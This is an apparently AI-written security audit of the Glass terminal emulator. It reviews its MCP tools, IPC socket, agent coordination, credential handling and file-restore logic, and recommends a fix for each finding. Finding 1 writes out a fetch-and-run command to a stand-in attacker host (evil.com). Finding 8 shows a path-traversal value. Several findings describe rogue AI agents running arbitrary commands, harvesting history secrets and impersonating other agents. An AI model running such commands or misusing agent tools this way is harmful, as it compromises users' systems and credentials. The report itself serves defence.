# Glass Security Audit Report

**Date:** 2026-03-18
**Scope:** Full codebase security review for prelaunch readiness
**Auditor:** Automated security analysis (Claude)
**Version:** 2.5.0 (commit a8fea40, branch master)

## Executive Summary

Glass is a GPU-accelerated terminal emulator that exposes significant surface area through its MCP server (30 tools), IPC channel, shell integration scripts, scripting engine, and multi-agent coordination system. The codebase demonstrates generally sound security practices -- all SQL uses parameterized queries, the Rhai scripting engine is sandboxed with hard ceilings, and file locks enforce ownership. However, several findings merit attention before production launch, particularly around the MCP `glass_tab_send` tool (arbitrary command execution), IPC authentication (none), and the agent coordination trust model.

**Findings Summary:**
- Critical: 1
- High: 4
- Medium: 6
- Low: 5

---

## Findings

### 1. MCP Server -- Arbitrary Command Execution via `glass_tab_send`

**Severity: CRITICAL**

**Files:**
- `crates/glass_mcp/src/tools.rs` lines 1195-1223
- `src/main.rs` lines 8987-9017

**Description:**
The `glass_tab_send` MCP tool accepts a `command` string parameter and writes it directly to a PTY session with `\r` appended. There are no restrictions on what commands can be sent. Any MCP client (AI agent) connected via stdio can execute arbitrary shell commands with the full privileges of the Glass process owner.

**Attack Vector:**
An AI agent with MCP access calls `glass_tab_send` with `command: "curl https://evil.com/payload | sh"`. The command executes in the user's terminal session with full user privileges.

**Impact:**
Full system compromise. Any MCP client can read/write arbitrary files, install malware, exfiltrate data, or pivot to other systems -- all running as the current user.

**Code:**
```rust
// src/main.rs line 8998
let input = format!("{}\r", command).into_bytes();
let _ = session.pty_sender.send(PtyMsg::Input(Cow::Owned(input)));
```

**Recommendation:**
1. Implement a permission/confirmation system for `glass_tab_send`. At minimum, require the Glass GUI user to approve commands before execution (similar to how `glass_core::config::PermissionMatrix` already defines `run_commands: PermissionLevel::Approve`).
2. Consider a command allowlist/blocklist configurable via `config.toml`.
3. Log all commands sent via this tool for audit purposes.
4. The same concern applies to `glass_tab_create` (can specify arbitrary shell) and `glass_cancel_command`.

---

### 2. IPC Channel -- No Authentication

**Severity: HIGH**

**Files:**
- `crates/glass_core/src/ipc.rs` lines 91-238
- `crates/glass_mcp/src/ipc_client.rs` lines 130-154

**Description:**
The IPC channel (Unix domain socket at `~/.glass/glass.sock` or Windows named pipe `\\.\pipe\glass-terminal`) accepts connections from any local process without authentication. Any process running as any user on the same machine can connect and issue commands.

**Attack Vector:**
1. On Unix: Any process can connect to `~/.glass/glass.sock` if permissions allow (default umask may create world-readable socket).
2. On Windows: Named pipe `\\.\pipe\glass-terminal` is created with default security descriptor, meaning any local user can connect.
3. A malicious local process connects and sends `tab_send` requests to execute commands.

**Impact:**
Local privilege escalation if Glass is running as a different user. Even same-user, any compromised process in any context can silently execute commands through Glass.

**Recommendation:**
1. On Unix: Set socket permissions to 0600 after creation (`chmod`).
2. On Windows: Create the named pipe with a restrictive security descriptor limiting access to the current user's SID.
3. Consider adding a session token that MCP clients must present (generated at Glass startup, passed via environment variable to child processes).
4. Rate-limit IPC connections and log connection events.

---

### 3. MCP Server -- No Access Controls or Rate Limiting

**Severity: HIGH**

**Files:**
- `crates/glass_mcp/src/tools.rs` (entire file, ~2000 lines)
- `crates/glass_mcp/src/lib.rs` lines 26-46

**Description:**
The MCP server exposes 30 tools over stdio with zero access controls. Once connected, a client has full access to all tools including:
- `glass_tab_send` (execute commands)
- `glass_tab_create` (create terminals with arbitrary shells/CWDs)
- `glass_undo` (modify files by restoring snapshots)
- `glass_history` (read all command history including output)
- `glass_agent_register`/`glass_agent_lock` (register fake agents, lock files)
- `glass_script_tool` (execute user-defined scripts)

There is no tool-level permission model, no rate limiting, and no audit logging.

**Attack Vector:**
A rogue or compromised AI agent connected to the MCP server can:
- Execute arbitrary commands via `glass_tab_send`
- Read command history (may contain sensitive data) via `glass_history`
- Interfere with other agents via coordination tools
- Execute user scripts via `glass_script_tool`

**Impact:**
Complete compromise of the Glass session. History may contain passwords typed at command prompts, environment variable dumps, etc.

**Recommendation:**
1. Implement the existing `PermissionMatrix` (`glass_core::config`) for MCP tools, not just agent proposals. The config already defines `edit_files`, `run_commands`, and `git_operations` permission levels.
2. Add per-tool authorization that checks against the permission matrix.
3. Add rate limiting per MCP session.
4. Add audit logging for all tool invocations.
5. Consider a tool allowlist in `config.toml` (the `allowed_tools` field in `AgentSection` already exists but is not enforced at the MCP layer).

---

### 4. Agent Coordination -- No Authentication for Agent Registration

**Severity: HIGH**

**Files:**
- `crates/glass_coordination/src/db.rs` lines 122-156 (register)
- `crates/glass_coordination/src/db.rs` lines 327-482 (lock_files)
- `crates/glass_mcp/src/tools.rs` lines 799-827 (glass_agent_register)

**Description:**
Any process that can connect to the MCP server or directly open `~/.glass/agents.db` can register as an agent with any name and type. Agent IDs are UUIDs generated server-side, but:
1. There is no verification that the registering process is what it claims to be.
2. Any registered agent can lock any file path, blocking legitimate agents.
3. Any agent can send messages to any other agent (impersonation via `from_agent`).
4. The coordination DB at `~/.glass/agents.db` is a shared SQLite file -- any process with file access can manipulate it directly.

**Attack Vector:**
1. A malicious process registers as "claude-code" agent, locks critical files, and blocks legitimate agents from editing them.
2. An attacker sends fake `request_unlock` messages to trick legitimate agents into releasing locks.
3. Direct SQLite manipulation bypasses all application-level checks.

**Impact:**
Denial of service for multi-agent workflows. Potential manipulation of agent behavior through fake messages.

**Recommendation:**
1. Add agent authentication via a shared secret (nonce) generated at registration time and required for subsequent operations.
2. Validate PID ownership at registration time -- the `pid` field exists but is only used for liveness checking, not authentication.
3. Consider using file permissions on `agents.db` to restrict access.
4. Add rate limiting on agent registrations per project.

---

### 5. OAuth Token Exposure

**Severity: HIGH**

**Files:**
- `src/usage_tracker.rs` lines 36-47, 50-56

**Description:**
The usage tracker reads the Anthropic OAuth access token from `~/.claude/.credentials.json` and uses it to poll the usage API. The token is:
1. Read from disk every 60 seconds (line 117).
2. Passed in an HTTP `Authorization: Bearer` header to `api.anthropic.com`.
3. Never explicitly zeroed from memory after use.

While reading another application's credentials is by design (Glass monitors Claude Code's rate limits), this creates a coupling where Glass has access to a credential that grants API access.

**Attack Vector:**
If Glass is compromised (e.g., via a malicious MCP client using `glass_tab_send`), the attacker could read `~/.claude/.credentials.json` to obtain the OAuth token and use it to make API calls.

**Impact:**
Unauthorized Anthropic API access, potential billing impact, credential theft.

**Recommendation:**
1. Document this credential access clearly in security documentation.
2. Use `zeroize` crate to clear the token from memory after each poll cycle.
3. Consider whether this functionality should be opt-in rather than automatic.
4. Ensure the token is never logged (currently not logged, but tracing statements nearby could leak it in debug mode).

---

### 6. Command History May Contain Sensitive Data

**Severity: MEDIUM**

**Files:**
- `crates/glass_history/src/db.rs` lines 167-189 (insert_command)
- `crates/glass_mcp/src/tools.rs` lines 552-592 (glass_history)
- `crates/glass_mcp/src/tools.rs` lines 1229-1291 (glass_tab_output)

**Description:**
Glass stores complete command text and output in SQLite databases under `~/.glass/` and project `.glass/` directories. This may include:
- Commands containing embedded passwords (e.g., `mysql -p password`, `curl -u user:pass`)
- Environment variable dumps (`env`, `printenv`) that may contain API keys
- Output of commands that display sensitive data

This data is accessible through MCP tools (`glass_history`, `glass_tab_output`, `glass_context`) to any connected MCP client.

**Attack Vector:**
An MCP client calls `glass_history` with no filters to dump all command history, then searches for patterns like passwords or API keys in command text and output.

**Impact:**
Credential leakage, sensitive data exposure through history queries.

**Recommendation:**
1. Add a configurable redaction filter that scrubs known sensitive patterns from stored command text and output (e.g., patterns matching `password=`, `token=`, bearer tokens).
2. Add a `glass_history.exclude_patterns` config option to prevent storing commands matching certain patterns.
3. Consider encrypting the history database at rest.
4. Add TTL-based auto-pruning of history (the retention module exists but requires explicit configuration).

---

### 7. Regex Denial of Service (ReDoS) via MCP Tools

**Severity: MEDIUM**

**Files:**
- `crates/glass_mcp/src/tools.rs` line 1264 (glass_tab_output pattern filter)
- `src/main.rs` line 9060 (tab_output IPC handler pattern parameter)

**Description:**
The `glass_tab_output` tool and its IPC counterpart accept a user-supplied `pattern` parameter that is compiled as a regex via `regex::Regex::new(pat)`. While Rust's `regex` crate is designed to avoid catastrophic backtracking, extremely complex patterns can still cause significant compilation time and memory usage.

**Attack Vector:**
An MCP client sends a `glass_tab_output` request with a pathologically complex regex pattern, causing high CPU/memory usage during pattern compilation.

**Impact:**
Denial of service -- temporary resource exhaustion. Mitigated by the `regex` crate's linear-time guarantees but pattern compilation itself can be expensive for very large patterns.

**Recommendation:**
1. Limit the maximum length of the `pattern` parameter (e.g., 1000 characters).
2. Set a compilation timeout or use `regex::RegexBuilder` with size limits.
3. The same applies to the orchestrator's `agent_prompt_pattern` config field (`src/main.rs` line 9060).

---

### 8. Blob Store -- Insufficient Hash Validation

**Severity: MEDIUM**

**Files:**
- `crates/glass_snapshot/src/blob_store.rs` lines 40-47 (read_blob)
- `crates/glass_snapshot/src/blob_store.rs` lines 86-98 (delete_blob)

**Description:**
The `BlobStore::read_blob` and `delete_blob` methods accept a hash string and use it to construct a filesystem path: `blob_dir/{hash[0:2]}/{hash}.blob`. While there is a minimum length check (`hash.len() >= 2`), there is no validation that the hash contains only hexadecimal characters. A crafted hash containing path separators (e.g., `../../etc/passwd`) could cause path traversal.

**Attack Vector:**
If an attacker can influence the hash parameter (e.g., through a corrupted snapshot database), they could read or delete arbitrary files. However, the hash is normally generated internally by blake3 and stored in the database, so external manipulation requires DB access.

**Impact:**
Limited -- requires either direct DB manipulation or a bug in hash generation. The hash comes from `blake3::hash().to_hex()` which only produces hex characters, and the DB path is under the user's control.

**Recommendation:**
1. Add hex character validation to `read_blob` and `delete_blob`: `ensure!(hash.chars().all(|c| c.is_ascii_hexdigit()))`.
2. Use `Path::join` carefully and verify the resulting path stays within `blob_dir` (canonicalize and check prefix).

---

### 9. Undo Engine -- No Path Restriction on File Restoration

**Severity: MEDIUM**

**Files:**
- `crates/glass_snapshot/src/undo.rs` lines 116-167 (restore_file)

**Description:**
The `UndoEngine::restore_file` method takes a `file_path` from the snapshot database and restores content to that path (or deletes the file). The file path stored in `snapshot_files.file_path` is an absolute path set during snapshot creation. If the snapshot database is tampered with, arbitrary files could be overwritten or deleted.

**Attack Vector:**
An attacker modifies the snapshot SQLite database to change a `file_path` entry to a sensitive system file (e.g., `~/.ssh/authorized_keys`). When the user triggers undo, the sensitive file is overwritten with blob content or deleted.

**Impact:**
Arbitrary file write/delete. Requires access to the project's `.glass/` directory to modify the snapshot DB, which is under the user's home directory.

**Recommendation:**
1. Validate that all file paths in the snapshot are within the project root before restoring.
2. Add a `project_root` parameter to `UndoEngine` and verify `file_path.starts_with(project_root)`.
3. Refuse to restore/delete files outside the project boundary.

---

### 10. Shell Integration -- Pipeline Temp Files

**Severity: MEDIUM**

**Files:**
- `shell-integration/glass.bash` lines 273-277 (cleanup), 285-298 (temp dir creation)

**Description:**
The shell integration pipeline capture creates temp directories at `${TMPDIR:-/tmp}/glass_${$}_$(date +%s%N)` with stage data. The PID and timestamp make the name predictable. While `mkdir -p` is used (which fails if the directory already exists as a symlink), there is a narrow TOCTOU window.

**Attack Vector:**
An attacker pre-creates a symlink at the predicted temp path pointing to a sensitive directory. When Glass writes pipeline stage data via `tee`, data could be written to the attacker-controlled location.

**Impact:**
Low -- requires precise timing and local access. The attacker would need to predict the exact PID and nanosecond timestamp. The `mkdir -p` creates a directory (not a file), which provides some protection.

**Recommendation:**
1. Use `mktemp -d` instead of constructing temp paths manually: `tmpdir=$(mktemp -d "${TMPDIR:-/tmp}/glass_XXXXXXXX")`.
2. Set restrictive permissions on temp directories: `chmod 700 "$tmpdir"`.

---

### 11. Ephemeral Agent Spawns Claude with `--dangerously-skip-permissions`

**Severity: MEDIUM**

**Files:**
- `src/ephemeral_agent.rs` lines 115-123

**Description:**
The ephemeral agent spawns `claude` with `--dangerously-skip-permissions` and `--allowedTools ""` (empty string). While the intent is to run a read-only analysis session with no tools, the `--dangerously-skip-permissions` flag bypasses Claude Code's permission system. If the `--allowedTools ""` flag parsing has a bug or changes behavior in a future version, the agent could have unrestricted access.

**Code:**
```rust
cmd.args([
    "-p",
    "--output-format", "stream-json",
    "--input-format", "stream-json",
    "--system-prompt-file", &prompt_path,
    "--allowedTools", "",
    "--dangerously-skip-permissions",
]);
```

**Impact:**
If `--allowedTools ""` is not correctly interpreted as "no tools," the ephemeral agent could execute arbitrary actions via Claude Code with no permission checks.

**Recommendation:**
1. Remove `--dangerously-skip-permissions` and rely solely on `--allowedTools ""` for restriction.
2. If `--dangerously-skip-permissions` is required for automation, add a comment explaining why and what mitigations are in place.
3. Add integration tests that verify the ephemeral agent cannot execute tools.

---

### 12. FTS5 Query Injection

**Severity: LOW**

**Files:**
- `crates/glass_history/src/query.rs` lines 118-129
- `crates/glass_history/src/search.rs` lines 30-37

**Description:**
User-supplied search text is wrapped in double quotes for FTS5 MATCH queries to escape special characters. The escaping replaces `"` with `""` (FTS5 quote escaping). This is correct for the standard case but FTS5 has other special syntax that could cause unexpected behavior (e.g., column filters with `command:`, prefix queries, NEAR operators).

The current escaping (`format!("\"{}\"", text.trim().replace('"', "\"\""))`) correctly handles double quotes but does not neutralize all FTS5 operators when they appear inside quotes. However, since all content is quoted, FTS5 treats the content as a phrase query, which is safe.

**Impact:**
Minimal. The quoting approach correctly prevents FTS5 injection. At worst, unexpected search results (not SQL injection).

**Recommendation:**
No immediate action needed. The current escaping is correct for phrase queries.

---

### 13. CWD Filter in History Uses LIKE with Unescaped Wildcards

**Severity: LOW**

**Files:**
- `crates/glass_history/src/query.rs` lines 153-155

**Description:**
The CWD filter in `filtered_query` uses SQL LIKE with the user-provided CWD value appended with `%`: `format!("{}%", cwd)`. If the user provides a CWD containing `%` or `_` characters, these act as SQL LIKE wildcards, matching more broadly than intended.

**Code:**
```rust
conditions.push("c.cwd LIKE ?".to_string());
params.push(rusqlite::types::Value::Text(format!("{}%", cwd)));
```

**Impact:**
Minimal. A user could specify a CWD of `%` to match all directories. This is a usability issue, not a security vulnerability, since the user controls both the filter and the data.

**Recommendation:**
Escape `%` and `_` characters in the CWD value before appending `%`, or use a different matching strategy (e.g., `GLOB` which uses `*` instead of `%`).

---

### 14. SQLite Databases Have No Encryption

**Severity: LOW**

**Files:**
- `crates/glass_history/src/db.rs` (history DB)
- `crates/glass_snapshot/src/db.rs` (snapshot DB)
- `crates/glass_coordination/src/db.rs` (coordination DB)

**Description:**
All three SQLite databases are stored unencrypted on disk:
- `~/.glass/agents.db` (coordination)
- Project `.glass/history.db` (command history with output)
- Project `.glass/snapshots.db` (file snapshot metadata)

The history database in particular may contain sensitive command output.

**Impact:**
Any process or user with file system access can read all stored data. On shared systems, this could expose sensitive information.

**Recommendation:**
1. For highly sensitive environments, consider using SQLite Encryption Extension (SEE) or SQLCipher.
2. Set restrictive file permissions (0600) on database files at creation time.
3. Document the data stored and its sensitivity in user-facing documentation.

---

### 15. Config Parsing -- Safe but Worth Noting

**Severity: LOW**

**Files:**
- `crates/glass_core/src/config.rs`

**Description:**
Config is parsed from TOML using `serde::Deserialize`. The config includes an `agent_prompt_pattern` field that is compiled as a regex, and a `verify_command` field that is used as a shell command for verification. While the config file is under the user's control (`~/.glass/config.toml`), a compromised config could:
1. Set `verify_command` to a malicious command.
2. Set `prd_path` to read files outside the project.

**Impact:**
Low -- the config file is controlled by the user. But if an attacker can write to `~/.glass/config.toml`, they can influence Glass behavior.

**Recommendation:**
1. Set restrictive permissions (0600) on `~/.glass/config.toml`.
2. Validate `prd_path` and `checkpoint_path` stay within the project directory.
3. Log when config values change (the hot-reload watcher already exists).

---

### 16. Scripting Engine -- Sandboxed but Capable

**Severity: LOW**

**Files:**
- `crates/glass_scripting/src/sandbox.rs`
- `crates/glass_scripting/src/engine.rs`
- `crates/glass_scripting/src/actions.rs`

**Description:**
The Rhai scripting engine is properly sandboxed with hard ceilings on operations (1M), timeout (10s), scripts per hook (25), and total scripts (500). However, scripts can emit powerful actions including:
- `Commit` / `IsolateCommit` (git operations)
- `RevertFiles` (modify files)
- `SetConfig` (change application configuration)
- `RegisterTool` / `UnregisterTool` (modify MCP tool registry)
- `InjectPromptHint` (influence orchestrator behavior)

These actions are returned to Glass for execution, not executed by the script itself, which is a good security boundary. However, a malicious script loaded from the project's `.glass/scripts/` directory could influence all of the above.

**Impact:**
A malicious script in a project's `.glass/scripts/` directory could manipulate Glass behavior. This is analogous to `.vscode/settings.json` or `.npmrc` trust issues in other tools.

**Recommendation:**
1. Add a user confirmation prompt when loading scripts from a new/untrusted project for the first time (similar to VS Code's workspace trust).
2. The `script_generation` config flag exists but is not a trust boundary -- user-authored scripts in a cloned repo could be malicious.

---

## Dependency Assessment

| Dependency | Version | Status |
|---|---|---|
| `rusqlite` | 0.38 (bundled) | Current, bundled SQLite avoids system library issues |
| `alacritty_terminal` | =0.25.1 (pinned) | Pinned exact version, good practice |
| `blake3` | 1.8.3 | Current, no known CVEs |
| `rhai` | 1.x | Sandboxed with hard limits |
| `wgpu` | 28.0 | Current |
| `tokio` | 1.50 | Current |
| `regex` | (transitive) | Uses `regex` crate with guaranteed linear-time matching |
| `ureq` | 3.x | HTTP client, used for usage API only |
| `git2` | 0.20 | Binds to libgit2; check for CVEs periodically |
| `notify` | (transitive) | Filesystem watcher; no known issues |
| `shlex` | 1.3 | Shell tokenization; review for edge cases |

**Recommendation:** Run `cargo audit` in CI to catch known vulnerabilities in dependencies.

---

## Priority Fix List

### Must-Fix Before Launch

1. **[CRITICAL] `glass_tab_send` command execution** -- Add permission checks or user confirmation for commands sent via MCP. This is the single highest-risk finding.

2. **[HIGH] IPC authentication** -- Add at minimum user-level access restrictions on the IPC socket/pipe. On Unix, set socket permissions to 0600. On Windows, restrict named pipe ACL.

3. **[HIGH] MCP tool-level permissions** -- Wire the existing `PermissionMatrix` and `allowed_tools` config into the MCP tool dispatch layer.

### Should-Fix Before Launch

4. **[HIGH] Agent coordination authentication** -- Add agent session tokens or PID verification to prevent impersonation.

5. **[HIGH] OAuth token handling** -- Use `zeroize` for the bearer token, ensure it's never logged.

6. **[MEDIUM] Command history redaction** -- Add configurable pattern-based redaction for sensitive data in stored commands/output.

7. **[MEDIUM] Undo path validation** -- Validate that restore paths are within the project root.

### Post-Launch / Hardening

8. **[MEDIUM] Ephemeral agent permissions** -- Remove `--dangerously-skip-permissions` or document the rationale.

9. **[MEDIUM] ReDoS protection** -- Add regex pattern length limits.

10. **[MEDIUM] Shell integration temp files** -- Use `mktemp -d` for secure temp directory creation.

11. **[LOW] Blob store hash validation** -- Add hex-only character validation.

12. **[LOW] Database file permissions** -- Set 0600 on all `.glass/` database files at creation.

13. **[LOW] Workspace trust for scripts** -- Add first-run trust prompt for project scripts.

14. **[LOW] Add `cargo audit` to CI** -- Catch dependency CVEs automatically.
